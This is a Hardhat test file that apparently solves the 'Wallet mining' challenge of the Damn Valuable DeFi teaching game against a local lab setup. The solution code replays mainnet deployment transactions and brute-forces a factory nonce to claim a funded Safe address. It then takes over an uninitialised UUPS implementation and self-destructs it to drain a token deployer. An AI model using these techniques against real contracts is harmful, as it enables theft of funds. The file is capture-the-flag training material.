const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { formatBytes32String } = require('ethers/lib/utils');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;

    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, ward, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
            { kind: 'uups', initializer: 'init' }
        );

        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);

        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        const printPlayerBalanceToken = async () => {
            const tokenBalance = await token.balanceOf(player.address);
            console.log("Player DVT balance is ", ethers.utils.formatEther(tokenBalance));
        }

        await printPlayerBalanceToken();

        const data = require("./deploy_tx.json");
        const factoryAbi = require("./factory_abi.json");
        const safeAbi = require("./safe_abi.json");

        // Feed the original wallet 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A with some ether
        // to be able to pay the gas to deploy the contracts

        const tx = {
            to: data.REPLAY_ADDRESS,
            value: ethers.utils.parseEther("1")
        }

        await (await player.sendTransaction(tx)).wait();

        console.log("Balance of replay address", ethers.utils.formatEther(await ethers.provider.getBalance(data.REPLAY_ADDRESS)));

        // Deploy the safeTx by replication executing the tx: 
        // https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3

        let deploySafeTx = await (await ethers.provider.sendTransaction(data.DEPLOY_SAFE_TX)).wait();
        console.log("Address of the SAFE contract:", deploySafeTx.contractAddress);

        // Execute the intermediate random tx

        await (await ethers.provider.sendTransaction(data.RANDOM_TX)).wait();
        // console.log("Address of the deployed contract", deploySafeTx.address);

        // Once we have the correct nonce deploy the Factory contract tx by replication
        // https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261

        const deployFactory = await (await ethers.provider.sendTransaction(data.DEPLOY_FACTORY_TX)).wait();
        console.log("Address of the FACTORY contract:", deployFactory.contractAddress);

        // After that we know that a contract deploy has 20 million DVT, so we will have by brute force
        // deploy contracts until we find the contract address with the tokens

        const contractAddressWithTokens = "0x9B6fb606A9f5789444c17768c6dFCF2f83563801";

        // const factoryContract = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
        //     token.address
        // );

        const factoryContract = await ethers.getContractAt(factoryAbi, deployFactory.contractAddress, player);
        const masterCopyContract = await ethers.getContractAt(safeAbi, deploySafeTx.contractAddress, player);
        let nonceRequired = 0;
        let contractAddress = "";

        while (!(contractAddress.toLowerCase() === contractAddressWithTokens.toLowerCase())) {
            contractAddress = ethers.utils.getContractAddress({
                from: deployFactory.contractAddress,
                nonce: nonceRequired
            });
            nonceRequired++;
        }
        console.log(`The nonce ${nonceRequired} is needed to obtain the address ${contractAddress}`);

        const createTxData = (contract, methodName, methodArguments) => {
            const txData = contract.interface.encodeFunctionData(methodName, methodArguments);
            return txData;
        }

        // Preparar los argumentos para la función setup
        const _owners = [player.address];  // Direcciones de los propietarios
        const _threshold = 1;
        const _to = ethers.constants.AddressZero;
        const _data = 0;
        const _fallbackHandler = ethers.constants.AddressZero;
        const _paymentToken = ethers.constants.AddressZero;
        const _payment = 0;
        const _paymentReceiver = ethers.constants.AddressZero;

        const setupData = await createTxData(masterCopyContract, "setup", [
            _owners,
            _threshold,
            _to,
            _data,
            _fallbackHandler,
            _paymentToken,
            _payment,
            _paymentReceiver
        ]);

        for (let index = 0; index < nonceRequired - 2; index++) {
            const conAddress = await (await factoryContract.createProxy(masterCopyContract.address, setupData)).wait()
        }

        console.log(`MasterCopy address ${masterCopyContract.address}`)

        // Deploy the contract with the 20M tokens with the nonce
        await (await factoryContract.createProxy(masterCopyContract.address, setupData)).wait();

        const contractWithTokens = await ethers.getContractAt(safeAbi, contractAddressWithTokens, player);

        // const transferTxData = token.interface.encodeFunctionData("transfer", player.address, 1);
        const transferTxData = createTxData(token, "transfer", [player.address, await token.balanceOf(contractAddressWithTokens)]);

        // // Obtain the Transaction hash signed by the owners

        const transactionParams = [
            token.address,
            0,
            transferTxData,
            0,
            0,
            0,
            0,
            ethers.constants.AddressZero,
            ethers.constants.AddressZero,
            0
        ];
        const txHash = await contractWithTokens.getTransactionHash(...transactionParams);
        const signed = await player.signMessage(ethers.utils.arrayify(txHash));
        console.log(`Player address ${player.address} is owner ${await contractWithTokens.isOwner(player.address)} `);
        // Increase signature by 4

        const signedIncreasedIV = ethers.BigNumber.from(signed).add(4).toHexString();
        await contractWithTokens.execTransaction(...(transactionParams.slice(0, -1)), signedIncreasedIV);

        await printPlayerBalanceToken();

        // Now we have to take the 43 tokens of the walletDeployer token

        // First we call the init function of the Authorizer (storage contract), it has not been disable
        // in the constructor so it can be called at the implementation (logic contract)

        // Get the implementation of the proxy
        //
        //@dev Storage slot with the address of the current implementation.
        //This is the keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1, and is
        //validated in the constructor.
        //

        const playerAuthStorage = authorizer.connect(player);
        const implementationSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
        implementationAddress = await ethers.provider.getStorageAt(playerAuthStorage.address, ethers.BigNumber.from(implementationSlot));
        implementationAddress = ethers.utils.hexStripZeros(implementationAddress);
        implementationAddress = ethers.utils.getAddress(implementationAddress);
        console.log(implementationAddress);

        const playerAuthLogic = playerAuthStorage.attach(implementationAddress);

        console.log(`Contract address ${playerAuthLogic.address}`);

        await playerAuthLogic.init([ethers.constants.AddressZero], [ethers.constants.AddressZero]);

        console.log(`Owner of the walletDeployImplementation is ${(await playerAuthLogic.owner()).toLowerCase() === (player.address).toLowerCase()}`)

        // Once player is the owner of the implementation contract we can call the function upgradeToAndCall due player is the owner
        // the thing is that this implementation won't be used due we are in the actual implementation so wont be any useful. But what
        // we can do is to call the upgradeToAndCall to execute the self_destruct contract and destroy the bytecode of the implementation.

        console.log(`Owner of the walletDeployImplementation is ${(await playerAuthLogic.owner()).toLowerCase() === (player.address).toLowerCase()}`)

        // Deploy the selfdestruct contract
        const attackWalletMining = await (await ethers.getContractFactory("AttackWalletMining", player)).deploy();
        // upgradeToAndCall(address imp, bytes memory wat)
        const txSelfDestructData = createTxData(attackWalletMining, "callSelfdestruct", [])
        await playerAuthLogic.upgradeToAndCall(attackWalletMining.address, txSelfDestructData);

        const walletDeployerPlayer = await walletDeployer.connect(player);

        // console.log(`Owner of the walletDeployImplementation is ${(await authorizer.owner()).toLowerCase() === (player.address).toLowerCase()}`);
        console.log(`Can function return ${await walletDeployer.can(player.address, player.address)}`);


        // We have bypass the can function so we can call 43 times the drop function to get all the tokens from walletDeployer

        let balance = ethers.utils.formatEther(await token.balanceOf(walletDeployer.address));
        // let balance = 43
        for (let index = 0; index < balance; index++) {
            await walletDeployerPlayer.drop("0x");
        }

        await printPlayerBalanceToken();

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');

        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
    });
});
